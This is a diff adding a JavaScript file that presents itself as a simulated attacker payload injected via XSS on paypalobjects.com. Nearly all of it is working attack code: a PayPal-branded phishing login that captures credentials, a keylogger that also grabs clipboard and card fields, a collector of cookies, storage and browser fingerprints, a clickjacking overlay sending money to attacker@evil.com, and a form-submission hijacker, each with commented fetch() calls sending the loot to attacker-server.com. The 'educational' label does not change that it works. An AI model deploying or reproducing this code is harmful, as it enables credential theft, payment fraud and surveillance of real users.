@@ -1,1 +1,595 @@
 alert('this is an xss');
+/**
+ * Malicious Payload - This simulates attacker-controlled JavaScript
+ *
+ * In real attack: <script src="https://attacker.com/malicious.js"></script>
+ *
+ * âš ï¸ FOR EDUCATIONAL PURPOSES ONLY âš ï¸
+ */
+
+(function() {
+    'use strict';
+
+    console.log('%cðŸš¨ MALICIOUS SCRIPT LOADED', 'color: red; font-size: 20px; font-weight: bold;');
+    console.log('%cThis simulates an attacker-controlled script on paypalobjects.com', 'color: orange;');
+
+    // Create namespace for attack scenarios
+    window.attackScenarios = {};
+
+    // ========================================================================
+    // SCENARIO 1: PHISHING ATTACK
+    // ========================================================================
+    window.attackScenarios.phishing = function() {
+        console.log('ðŸŽ£ Launching phishing attack...');
+
+        // Clear the page
+        document.body.innerHTML = '';
+        document.head.innerHTML = '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to your PayPal account</title>';
+
+        // Inject styles
+        const style = document.createElement('style');
+        style.textContent = `
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+                background: #f5f7fa;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                padding: 20px;
+            }
+            .container {
+                background: white;
+                padding: 40px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                max-width: 400px;
+                width: 100%;
+            }
+            .logo {
+                text-align: center;
+                margin-bottom: 30px;
+            }
+            .logo svg {
+                width: 100px;
+                height: 32px;
+            }
+            h2 {
+                color: #2c2e2f;
+                font-size: 24px;
+                margin-bottom: 20px;
+            }
+            .alert {
+                background: #fff3cd;
+                border: 1px solid #ffc107;
+                padding: 12px;
+                border-radius: 4px;
+                margin-bottom: 20px;
+                color: #856404;
+                font-size: 14px;
+            }
+            input {
+                width: 100%;
+                padding: 12px;
+                margin-bottom: 15px;
+                border: 1px solid #cbd2d9;
+                border-radius: 4px;
+                font-size: 14px;
+            }
+            input:focus {
+                outline: none;
+                border-color: #0070ba;
+            }
+            button {
+                width: 100%;
+                padding: 14px;
+                background: #0070ba;
+                color: white;
+                border: none;
+                border-radius: 20px;
+                font-size: 16px;
+                cursor: pointer;
+                font-weight: bold;
+            }
+            button:hover { background: #005ea6; }
+            .links {
+                margin-top: 20px;
+                text-align: center;
+                font-size: 13px;
+                color: #687173;
+            }
+            .links a {
+                color: #0070ba;
+                text-decoration: none;
+            }
+            .demo-notice {
+                background: #e3f2fd;
+                border: 2px solid #2196F3;
+                padding: 15px;
+                margin-bottom: 20px;
+                border-radius: 4px;
+                color: #1565C0;
+                font-size: 13px;
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Create fake login form
+        const html = `
+            <div class="container">
+                <div class="demo-notice">
+                    <strong>ðŸ” DEMO MODE:</strong> This is what victims would see.
+                    Notice the URL says "paypalobjects.com" (trusted domain) but it's actually phishing.
+                </div>
+
+                <div class="logo">
+                    <svg viewBox="0 0 100 32" xmlns="http://www.w3.org/2000/svg">
+                        <text x="0" y="24" fill="#0070ba" font-size="24" font-weight="bold" font-family="Verdana">PayPal</text>
+                    </svg>
+                </div>
+
+                <div class="alert">
+                    <strong>âš ï¸ Session Expired</strong><br>
+                    Your session has timed out. Please log in again to continue.
+                </div>
+
+                <h2>Log in to your account</h2>
+
+                <form id="phishing-form">
+                    <input
+                        type="email"
+                        name="email"
+                        placeholder="Email or mobile number"
+                        required
+                        autocomplete="username"
+                    >
+                    <input
+                        type="password"
+                        name="password"
+                        placeholder="Password"
+                        required
+                        autocomplete="current-password"
+                    >
+                    <button type="submit">Log In</button>
+                </form>
+
+                <div class="links">
+                    <a href="#">Forgot password?</a> â€¢
+                    <a href="#">Sign Up</a>
+                </div>
+            </div>
+        `;
+
+        document.body.innerHTML = html;
+
+        // Steal credentials when submitted
+        document.getElementById('phishing-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = e.target.email.value;
+            const password = e.target.password.value;
+
+            const stolenData = {
+                email: email,
+                password: password,
+                domain: window.location.hostname,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            };
+
+            console.log('%cðŸš¨ CREDENTIALS STOLEN!', 'color: red; font-size: 16px; font-weight: bold;');
+            console.log('Data that would be sent to attacker:', stolenData);
+
+            // In real attack:
+            // fetch('https://attacker-server.com/steal', {
+            //     method: 'POST',
+            //     body: JSON.stringify(stolenData)
+            // });
+
+            alert('ðŸš¨ DEMO: Credentials captured!\n\nEmail: ' + email + '\nPassword: ' + password + '\n\nCheck console for details.\n\nIn real attack, this would be sent to attacker\'s server and you\'d be redirected to real PayPal.');
+        });
+
+        console.log('âœ… Phishing page loaded. Victims see official-looking login on paypalobjects.com domain.');
+    };
+
+
+    // ========================================================================
+    // SCENARIO 2: KEYLOGGER
+    // ========================================================================
+    window.attackScenarios.keylogger = function() {
+        console.log('âŒ¨ï¸ Keylogger activated...');
+
+        const keyLog = [];
+        const sensitiveLog = [];
+
+        // Capture all keystrokes
+        document.addEventListener('keydown', function(e) {
+            const entry = {
+                key: e.key,
+                code: e.code,
+                timestamp: new Date().toISOString(),
+                target: e.target.tagName + (e.target.name ? '[name=' + e.target.name + ']' : ''),
+                targetType: e.target.type || 'none'
+            };
+
+            keyLog.push(entry);
+
+            // Log to console
+            console.log('%câŒ¨ï¸ KEY:', 'color: orange;', entry);
+
+            // Display in demo
+            const capturedDiv = document.getElementById('captured-keys');
+            if (capturedDiv) {
+                capturedDiv.textContent = 'Last 10 keys: ' +
+                    keyLog.slice(-10).map(k => k.key).join('');
+            }
+
+            // In real attack, send periodically:
+            if (keyLog.length >= 20) {
+                console.log('%cðŸ“¤ Sending keylog batch to attacker...', 'color: red;', keyLog);
+                // fetch('https://attacker-server.com/keylog', {
+                //     method: 'POST',
+                //     body: JSON.stringify(keyLog)
+                // });
+                // keyLog.length = 0; // Clear after sending
+            }
+        });
+
+        // Monitor input fields specifically
+        document.addEventListener('input', function(e) {
+            if (e.target.type === 'password' ||
+                e.target.type === 'email' ||
+                e.target.name?.toLowerCase().includes('card')) {
+
+                const sensitiveEntry = {
+                    field: e.target.name || e.target.id || 'unknown',
+                    type: e.target.type,
+                    value: e.target.value, // ðŸš¨ Stealing the value
+                    timestamp: new Date().toISOString()
+                };
+
+                sensitiveLog.push(sensitiveEntry);
+                console.log('%cðŸ”‘ SENSITIVE INPUT:', 'color: red; font-weight: bold;', sensitiveEntry);
+
+                // In real attack:
+                // fetch('https://attacker-server.com/sensitive', {
+                //     method: 'POST',
+                //     body: JSON.stringify(sensitiveEntry)
+                // });
+            }
+        }, true);
+
+        // Capture clipboard
+        document.addEventListener('paste', function(e) {
+            const pastedData = e.clipboardData.getData('text');
+            console.log('%cðŸ“‹ CLIPBOARD CAPTURED:', 'color: red;', pastedData);
+
+            // In real attack:
+            // fetch('https://attacker-server.com/clipboard', {
+            //     method: 'POST',
+            //     body: JSON.stringify({ data: pastedData })
+            // });
+        });
+
+        console.log('âœ… Keylogger active. All keystrokes will be captured and logged.');
+    };
+
+
+    // ========================================================================
+    // SCENARIO 3: DATA EXFILTRATION
+    // ========================================================================
+    window.attackScenarios.dataExfil = function() {
+        console.log('ðŸ’¾ Collecting all available data...');
+
+        const exfilData = {
+            // Cookies (paypalobjects.com only due to SOP)
+            cookies: document.cookie || 'No cookies',
+
+            // Storage
+            localStorage: {},
+            sessionStorage: {},
+
+            // Browser fingerprint
+            browser: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                screenResolution: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            },
+
+            // Page info
+            page: {
+                url: window.location.href,
+                referrer: document.referrer,
+                title: document.title,
+                domain: window.location.hostname,
+                protocol: window.location.protocol
+            },
+
+            // Performance data
+            performance: {
+                navigation: performance.navigation?.type,
+                timing: {
+                    loadTime: performance.timing?.loadEventEnd - performance.timing?.navigationStart,
+                    domReady: performance.timing?.domContentLoadedEventEnd - performance.timing?.navigationStart
+                }
+            },
+
+            // Network info (if available)
+            connection: null,
+
+            // Plugins (mostly empty in modern browsers)
+            plugins: Array.from(navigator.plugins || []).map(p => ({
+                name: p.name,
+                description: p.description
+            })),
+
+            timestamp: new Date().toISOString()
+        };
+
+        // Get localStorage
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                exfilData.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch (e) {
+            exfilData.localStorage = 'Access denied';
+        }
+
+        // Get sessionStorage
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                exfilData.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch (e) {
+            exfilData.sessionStorage = 'Access denied';
+        }
+
+        // Get network info
+        if (navigator.connection) {
+            exfilData.connection = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        }
+
+        // Check for interesting global variables
+        const interestingKeys = Object.keys(window).filter(key =>
+            key.toLowerCase().includes('paypal') ||
+            key.toLowerCase().includes('user') ||
+            key.toLowerCase().includes('session') ||
+            key.toLowerCase().includes('token') ||
+            key.toLowerCase().includes('auth')
+        );
+
+        if (interestingKeys.length > 0) {
+            exfilData.globalVariables = {};
+            interestingKeys.forEach(key => {
+                try {
+                    exfilData.globalVariables[key] = typeof window[key];
+                } catch (e) {
+                    exfilData.globalVariables[key] = 'Access denied';
+                }
+            });
+        }
+
+        console.log('%cðŸ“¤ DATA EXFILTRATION COMPLETE', 'color: red; font-size: 16px; font-weight: bold;');
+        console.log('Data that would be sent to attacker:', exfilData);
+
+        // In real attack:
+        // fetch('https://attacker-server.com/exfil', {
+        //     method: 'POST',
+        //     body: JSON.stringify(exfilData)
+        // });
+
+        return exfilData;
+    };
+
+
+    // ========================================================================
+    // SCENARIO 4: CLICKJACKING
+    // ========================================================================
+    window.attackScenarios.clickjacking = function() {
+        console.log('ðŸŽ¯ Launching clickjacking attack...');
+
+        document.body.innerHTML = '';
+
+        const style = document.createElement('style');
+        style.textContent = `
+            * { margin: 0; padding: 0; }
+            body {
+                margin: 0;
+                overflow: hidden;
+                font-family: Arial, sans-serif;
+            }
+            #fake-content {
+                position: relative;
+                z-index: 1;
+                padding: 50px;
+                text-align: center;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                color: white;
+            }
+            #fake-content h1 {
+                font-size: 48px;
+                margin-bottom: 20px;
+            }
+            .prize-box {
+                background: white;
+                color: #333;
+                padding: 40px;
+                border-radius: 15px;
+                display: inline-block;
+                margin-top: 30px;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            }
+            .fake-button {
+                padding: 20px 60px;
+                background: #4CAF50;
+                color: white;
+                border: none;
+                font-size: 24px;
+                cursor: pointer;
+                border-radius: 50px;
+                margin-top: 20px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+                font-weight: bold;
+            }
+            .fake-button:hover {
+                background: #45a049;
+                transform: scale(1.05);
+            }
+            #hidden-paypal {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                opacity: 0.01;
+                z-index: 999;
+                pointer-events: all;
+                border: none;
+            }
+            .demo-warning {
+                position: fixed;
+                top: 10px;
+                left: 10px;
+                background: #ff9800;
+                color: white;
+                padding: 10px;
+                border-radius: 5px;
+                font-size: 12px;
+                z-index: 10000;
+            }
+        `;
+        document.head.appendChild(style);
+
+        document.body.innerHTML = `
+            <div class="demo-warning">
+                ðŸ” DEMO: The "Claim Prize" button has an invisible PayPal iframe over it
+            </div>
+
+            <div id="fake-content">
+                <h1>ðŸŽ‰ Congratulations!</h1>
+                <div class="prize-box">
+                    <h2>You've Won!</h2>
+                    <p style="font-size: 36px; margin: 20px 0;">$100 PayPal Cash</p>
+                    <p>Click below to claim your prize instantly:</p>
+                    <button class="fake-button">ðŸ’° Claim $100 Now!</button>
+                    <p style="font-size: 12px; margin-top: 20px; color: #666;">
+                        Limited time offer â€¢ No signup required
+                    </p>
+                </div>
+            </div>
+
+            <!-- Hidden PayPal iframe (almost invisible) -->
+            <!-- In real attack, this would load:
+                 https://www.paypal.com/myaccount/transfer/send?amount=500&to=attacker@evil.com
+            -->
+            <iframe
+                id="hidden-paypal"
+                srcdoc="<div style='padding: 200px; text-align: center; font-family: Arial;'><h1>PayPal Send Money</h1><button style='padding: 20px 60px; background: #0070ba; color: white; border: none; border-radius: 50px; font-size: 20px; cursor: pointer;'>Send $500 to attacker@evil.com</button></div>"
+            ></iframe>
+        `;
+
+        console.log('âœ… Clickjacking page loaded.');
+        console.log('ðŸŽ¯ User thinks they\'re clicking "Claim $100" but actually clicking hidden PayPal button');
+        console.log('âš ï¸ In real attack, the iframe would load actual PayPal send money page');
+    };
+
+
+    // ========================================================================
+    // SCENARIO 5: FORM HIJACKING
+    // ========================================================================
+    window.attackScenarios.formHijack = function() {
+        console.log('ðŸ“ Form hijacking activated...');
+
+        document.getElementById('demo-container').innerHTML = `
+            <h2>Form Hijacking Demo</h2>
+            <p>All form submissions on this page will be intercepted and sent to attacker.</p>
+
+            <form id="test-form" style="max-width: 400px; margin-top: 20px;">
+                <input type="text" name="fullname" placeholder="Full Name"
+                       style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px;">
+                <input type="email" name="email" placeholder="Email"
+                       style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px;">
+                <input type="tel" name="phone" placeholder="Phone Number"
+                       style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px;">
+                <input type="text" name="cardnumber" placeholder="Card Number"
+                       style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px;">
+                <button type="submit" style="width: 100%; padding: 12px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; margin-top: 10px;">Submit</button>
+            </form>
+
+            <div id="hijack-log" style="background: #f0f0f0; padding: 15px; margin-top: 20px; font-family: monospace; font-size: 12px; max-height: 200px; overflow: auto;"></div>
+        `;
+
+        // Hijack all form submissions
+        document.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
+
+            const stolenFormData = {
+                url: window.location.href,
+                formAction: e.target.action || 'none',
+                formMethod: e.target.method || 'get',
+                fields: data,
+                timestamp: new Date().toISOString()
+            };
+
+            console.log('%cðŸ“ FORM DATA HIJACKED!', 'color: red; font-size: 16px; font-weight: bold;');
+            console.log('Data that would be sent to attacker:', stolenFormData);
+
+            const logDiv = document.getElementById('hijack-log');
+            if (logDiv) {
+                logDiv.textContent = 'ðŸš¨ FORM INTERCEPTED!\n\n' +
+                    JSON.stringify(stolenFormData, null, 2);
+            }
+
+            alert('ðŸš¨ Form data captured!\n\n' + JSON.stringify(data, null, 2) + '\n\nCheck console for details.');
+
+            // In real attack:
+            // fetch('https://attacker-server.com/form-data', {
+            //     method: 'POST',
+            //     body: JSON.stringify(stolenFormData)
+            // });
+
+        }, true); // Use capture phase to catch all forms
+
+        console.log('âœ… Form hijacking active. All form submissions will be intercepted.');
+    };
+
+
+    // ========================================================================
+    // AUTO-RUN DATA EXFILTRATION (Silent)
+    // ========================================================================
+    // In real attack, this would run immediately without user interaction
+    setTimeout(function() {
+        console.log('%cðŸ¤– Auto-running silent data collection...', 'color: purple;');
+        // Uncomment to auto-run:
+        // window.attackScenarios.dataExfil();
+    }, 1000);
+
+
+    console.log('%câœ… All attack scenarios loaded and ready', 'color: green; font-weight: bold;');
+    console.log('Available scenarios:', Object.keys(window.attackScenarios));
+
+})();
